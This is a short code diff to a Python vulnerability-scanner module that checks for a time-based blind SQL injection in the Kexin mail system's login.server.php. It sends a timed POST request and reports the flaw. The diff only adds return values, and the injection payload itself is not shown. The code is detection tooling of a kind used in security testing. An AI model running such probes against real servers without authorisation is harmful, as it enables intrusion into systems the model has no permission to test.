@@ -33,11 +33,13 @@ class kxmail_login_server_sqli_BaseVerify:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if time.time() - start_time >= 6:
                 cprint("[+]存在科信邮件系统login.server.php 时间盲注漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return True, vulnurl, "科信邮件系统login.server.php 时间盲注", payload, req.text
             else:
                 cprint("[-]不存在kxmail_login_server_sqli漏洞", "white", "on_grey")
-
+                return False, None, None, None, None
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
